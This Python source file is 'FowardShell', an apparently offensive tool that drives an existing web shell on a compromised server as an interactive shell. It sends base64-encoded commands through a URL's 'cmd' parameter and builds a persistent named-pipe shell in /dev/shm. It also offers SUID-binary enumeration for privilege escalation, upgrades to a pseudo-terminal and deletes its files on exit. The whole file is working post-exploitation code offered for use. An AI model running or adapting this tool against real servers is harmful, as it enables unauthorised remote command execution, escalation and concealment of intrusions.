#!/bin/env python3

import requests, time, threading, signal, sys, argparse, readline, os

from base64 import b64encode
from random import randrange

def get_Argument() -> argparse.Namespace:
    try:
        parse = argparse.ArgumentParser(prog="Fshell",description="This is FowardShell")
        parse.add_argument('-u','--url',dest='url',metavar='<url>',type=str,required= True,help='URL')
        parse.add_argument('-i','--interval',dest='interval',metavar='<interval>',type=int,help='Time interval')

        if len(sys.argv) <= 1 or '-h' in sys.argv:
            parse.print_help()
            sys.exit(1)
        return parse.parse_args()
    except argparse.ArgumentError:
        print("[x] Error parsing arguments")

class Colours:
    color_codes = {
        'green':"\033[38;5;40m",          # Green
        'dark_green':"\033[38;5;82m",     # Dark Green
        'light_green':"\033[38;5;118m",   # light green 
        'reset':"\033[38;0;0m",           # reset
        'yellow':"\033[38;5;226m",        # yellow
        #'light_yellow':"\033[38;5;87m",   # ligth yellow
        'light_yellow':"\033[38;5;229m",  # ligth yellow
        'blue':"\033[38;5;27m",           # blue
        'light_blue':"\033[38;5;39m",     # ligth blue
        'red':"\033[38;5;196m",           # Red
        'light_red':"\033[38;5;203m",     # ligth red
        'purple':"\033[38;5;165m",        # Purple
        'orange':"\033[38;5;208m",        # orange
        'pink':"\033[38;5;211m",          # pink
        'cyan':"\033[38;5;51m",           # Cyan
        'gray':"\033[38;5;240m",          # Gray
        'magenta':"\033[38;5;213m",       # Magenta
        'light_magenta':"\033[38;5;219m", # Ligth magenta
        'reset': "\033[0m",               # reset colours
    }

    def __getattr__(self, name):
        if name in self.color_codes:
            return self.color_codes[name]
        else:
            raise AttributeError(f"Color '{name}' not found.")

class WriteObj:
    colours = Colours()

    def print_debug(self, error: str, message: str, end="\n") -> None:
        error_level = {"OK":f"{self.colours.green}[+]{self.colours.reset} {message}",
                       "FAILED":f"{self.colours.blue}[x]{self.colours.reset} {message}",
                       "ERROR":f"{self.colours.red}[-]{self.colours.reset} {message}",
                       "WARNING":f"{self.colours.yellow}[!]{self.colours.reset} {message}",
                       " ": f"{message}"}
        
        print(error_level.get(error, f"{message}"), end=end)

class FshellMenu(WriteObj):

    def __init__(self):
        self.__autor__ = "Ch4rum"
        self.__copyright__ = "Copyright © 2025 Ch4rum -> https://www.instagram.com/Ch4rum/"
        self.__version__ = "Version 1.1"
        self.__maintainer__ = "Ch4rum"

    def print_banner(self):
        self.print_debug(" ",f"""{self.colours.yellow}
        ▗▄▄▄▖▄   ▄  ▗▄▄▖▐▌   ▗▞▀▚▖█ █ 
        ▐▌   █ ▄ █ ▐▌   ▐▌   ▐▛▀▀▘█ █ 
        ▐▛▀▀▘█▄█▄█  ▝▀▚▖▐▛▀▚▖▝▚▄▄▖█ █ 
        ▐▌         ▗▄▄▞▘▐▌ ▐▌     █ █ {self.colours.reset}{self.colours.light_blue}v{self.__version__.split()[1]}{self.colours.reset}
    \n\t{self.colours.light_red}{self.__copyright__}{self.colours.reset}
                              """)
    
    def main_menu(self):
        args = get_Argument()
        if args.url:
            self.print_banner()
            self.print_debug("OK","Start FwShell...")
            console = CommandLine(args)
            console.run()

class CommandLine(WriteObj):

    def __init__(self, args):
        self.history = list()
        self.fws = FwShell(args.url)
        self.tmp = f"{self.colours.green}>{self.colours.reset}"
        self.Pseudo = self.tmp
        self.COMMAND = {
            "help": "Show this help panel",
            "enum suid": "find / -perm -4000 2>/dev/null | xargs ls -l",
            "pseudoterminal": "script /dev/null -c /bin/bash"
        }
        if args.interval:
            self.fws.set_interval(args.interval)
        signal.signal(signal.SIGINT, self.ctrl_c)
        readline.set_history_length(50)

    def run(self) -> None:
        if not self.fws.SetupShell():
            self.print_debug("FAILED","Error session.\n")
            return

        self.fws.run_Read()
        while True:
            try:
                if self.fws.is_pseudo_terminal:
                    self.Pseudo = self.read_Pseudo()
                    self.colorPS()
                prompt = "\n%s%s>%s "%(self.Pseudo, self.colours.green, self.colours.reset)
                current_command = input(prompt)
                possible_command = ["bash", "/bin/bash", "/usr/bin/bash", "/usr/local/bin/bash", "sh", "/bin/sh", "/usr/bin/sh", "/usr/local/bin/sh"]
                if current_command:
                    if current_command in self.COMMAND:
                        current_command = self.COMMAND[current_command]
                    if any(f"script /dev/null -c {cmd}" in current_command for cmd in possible_command):
                        self.fws.set_pseudoterminal("true")
                    elif current_command.strip() == "exit":
                        self.fws.set_pseudoterminal("false")
                        self.Pseudo = self.tmp
                    if "help" in current_command.strip():
                        self.print_debug("OK","Command to send: ")
                        for key, values in self.COMMAND.items():
                            self.print_debug(" ", f"\t{key}: {values}")
                        continue
                    self.history.append(current_command)
                    self.fws.WriteCommand(current_command + "\n")
                    time.sleep(self.fws.interval + 0.5)
            except Exception as err:
                self.print_debug("ERROR", err)

    def ctrl_c(self, sig, frame) -> None:
        self.fws.delshutdowns()
        sys.exit(0)

    def read_Pseudo(self) -> None:
        if os.path.exists('/tmp/.pseudo.log'):
            with open("/tmp/.pseudo.log", "r") as f:
                pse = f.read().strip()
                return pse.replace("\x00", "")
        return ""

    def colorPS(self):
        if "php" in self.Pseudo:
            tmp = self.Pseudo.split(" ")
        else:
            tmp = self.Pseudo.split(":")
        if len(tmp) == 2:
            if "php" in self.Pseudo:
                self.Pseudo = f"{self.colours.magenta}{tmp[0]} {self.colours.reset}{tmp[1]}" 
                return
            tmp2 = tmp[0].split("@")
            self.Pseudo = f"{self.colours.light_magenta}{tmp2[0]}{self.colours.reset}@{self.colours.red}{tmp2[1]}{self.colours.reset}:{self.colours.cyan}{tmp[1]}{self.colours.reset}"
                
class AllTheReads(WriteObj):

    def __init__(self, fws):
        self.fws = fws
        self.thread = threading.Thread(target=self.run, daemon=True).start()

    def run(self) -> None:
        readoutput = f"/bin/cat {self.fws.stdout}"
        clearoutput = f"echo '' > {self.fws.stdout}"
        while True:
            for _ in range(5):
                output = self.fws.runCommand(readoutput)
                time.sleep(0.1)
            if output:
                if output.text.strip():
                    self.fws.runCommand(clearoutput)
                    lines = output.text.strip().split("\n")
                    if self.fws.is_pseudo_terminal:
                        if len(lines) == 2:
                            self.print_debug(" ", lines[-1])
                        else:
                            self.print_debug(" ","\n".join(line for line in (lines[1:-1])))
                        self.Write_Pseudo(lines[-1])
                    else:
                        if "exit" in lines[0]:
                            self.print_debug(" ","\n".join(line for line in (lines[1:])))
                        else:
                            self.print_debug(" ", output.text.strip())
            time.sleep(self.fws.interval -0.5)
    
    def Write_Pseudo(self, pseudo) -> None:
        with open("/tmp/.pseudo.log", "w") as f:
            f.write(pseudo)

class FwShell(WriteObj):

    def __init__(self, url, interval = 0.5):
        session = randrange(1000, 9999)
        self.main_url = url
        self.interval = interval
        self.stdin = "/dev/shm/input.%s" % (session)
        self.stdout = "/dev/shm/output.%s" % (session)
        self.is_pseudo_terminal = False
        
    def run_Read(self) -> None:
        ReadingTheThings = AllTheReads(self)

    def set_interval(self, interval) -> None:
        self.interval = interval

    def set_pseudoterminal(self, boolean) -> None:
        if boolean == "true":
            self.is_pseudo_terminal = True
        else:
            self.is_pseudo_terminal = False


    def delshutdowns(self) -> None:
        erase_stdin = f"/bin/rm {self.stdin}"
        erase_stdout = f"/bin/rm {self.stdout}"
        self.print_debug(" ","\n")
        self.print_debug("WARNING","Exiting...\n")
        self.print_debug("OK","Removing files...\n")
        self.runCommand(erase_stdin)
        self.runCommand(erase_stdout)
        os.system("rm -rf /tmp/.pseudo.log")
        self.print_debug("OK", "All files have been deleted\n")

    def encodeData(self, command) -> str:
        return b64encode(command.encode('utf-8')).decode('utf-8')

    def SetupShell(self) -> bool:
        NamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh 2>&1 > {self.stdout}"
        check_command = f"ls {self.stdin} {self.stdout} && echo 'OK' || echo 'FAIL'"
        try:
            self.runCommand(NamedPipes)
            iFifo = self.runCommand(check_command)
            if iFifo and iFifo.status_code == 200:
                if 'OK' in iFifo.text:
                    return True
            return False
        except:
            return None

    def runCommand(self, command) -> str:
        payload = {
                'cmd' : f'echo "{self.encodeData(command)}" | base64 -d | sh'
            }
        return self.sendCommand(payload)

    def WriteCommand(self, command) -> str:
        payload = {
            'cmd' : f'echo "{self.encodeData(command)}" | base64 -d > {self.stdin}'
        }
        return self.sendCommand(payload)
    
    def sendCommand(self, payload) -> str:
        try:
            result = requests.get(self.main_url, params=payload, timeout=5)
            return result
        except:
            return None

if __name__ == "__main__":
    menu = FshellMenu()
    menu.main_menu()
